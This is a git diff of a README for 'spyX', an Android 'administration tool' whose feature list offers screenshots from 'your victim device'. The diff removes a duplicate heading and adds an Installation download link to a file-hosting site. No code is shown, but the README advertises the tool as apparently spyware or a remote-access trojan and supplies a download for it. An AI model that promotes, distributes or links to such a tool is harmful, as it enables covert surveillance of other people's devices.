@@ -16,7 +16,6 @@ spyX , powerfull android administration tool full of feature
 - user friendly UI
 - ✨easy to use
 
-## Features
 
 ## Features
 - 🖥️ Screenshot (get screenshot from your victim device)
@@ -49,3 +48,5 @@ spyX , powerfull android administration tool full of feature
 
 ## Installation
 
+
+[DOWNLOAD](https://mega.nz/file/pWcBgSRD#sYOTn58Nr5D2bBe1W7p4fobrUo9-4mx_KxfnBSDPoX8)
